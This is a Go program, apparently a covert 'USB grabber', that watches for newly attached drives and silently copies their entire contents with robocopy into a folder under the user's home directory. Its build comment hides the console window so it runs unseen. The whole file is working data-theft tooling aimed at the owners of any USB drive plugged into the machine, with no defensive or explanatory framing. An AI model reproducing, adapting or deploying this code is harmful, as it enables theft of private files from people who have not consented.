// BUILD FLAG= ` go build -ldflags="-H windowsgui" -o grabber.exe `

package main

import (
	"flag"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	USB   string   = "F:" // USB directory, initially set to the F: drive for testing
	SAVE  string          // Save directory
	OLD   []string        // Save file directory, used to check changes in USB files
	drive = make(map[string]bool)
)

func init() {
	flag.StringVar(&SAVE, "dir", "C:"+os.Getenv("HOMEPATH")+"\\grabbed", "Specify the save directory")
	flag.Parse()
}

// USB copying
func usbWalker() {
	if _, err := os.Stat(SAVE); err == nil {
		fmt.Println("DELETE EXISTING FILES!")
		if err := os.RemoveAll(SAVE); err != nil {
			fmt.Println(err)
			SAVE = SAVE + "NewFile" + fmt.Sprintf("%f", rand.Float64()*10)
		}
	}

	fmt.Println("FileName  " + SAVE)
	fmt.Println("Copying...")

	USB = strings.TrimRight(USB, "/")
	SAVE = strings.TrimRight(SAVE, "/")

	copyDir(USB, SAVE)
}

func copyDir(src, dest string) {
	cmd := exec.Command("robocopy", src, dest, "/e", "/mt:32", "/xd", "System Volume Information")

	// Redirect both stdout and stderr
	cmd.Stderr = os.Stderr
	cmd.Stdout = os.Stdout

	cmd.Run()
}

// Check if USB content has changed
func getUsb() bool {
	NEW, err := os.ReadDir(USB)
	if err != nil {
		fmt.Println(err)
		return false
	}

	if len(NEW) == len(OLD) {
		fmt.Println("USB content has not changed")
		return false
	} else {
		OLD = make([]string, len(NEW))
		for i, file := range NEW {
			OLD[i] = file.Name()
		}
		return true
	}
}

// Check if USB is connected and copy
func usbCopy() {
	for i := 65; i <= 90; i++ {
		name := string(rune(i)) + ":"
		fmt.Println(name)
		_, err := os.Stat(name)
		if err == nil {
			drive[string(rune(i))] = true
			fmt.Println("Drive " + string(rune(i)) + " exists")
		}
	}

	for {
		for i := 65; i <= 90; i++ {
			name := string(rune(i)) + ":"
			_, err := os.Stat(name)
			if err != nil {
				drive[string(rune(i))] = false
			}
			if err == nil && !drive[string(rune(i))] {
				USB = name
				fmt.Println("USB detected")
				if getUsb() {
					usbWalker()
				}
			}
		}

		fmt.Println("No USB for now, going to sleep")
		time.Sleep(1 * time.Second) // Sleep time
		fmt.Println("Sleep over")
	}
}

func main() {
	fmt.Println("Default file path:", SAVE)
	fmt.Println("Started grabber")
	usbCopy()
}
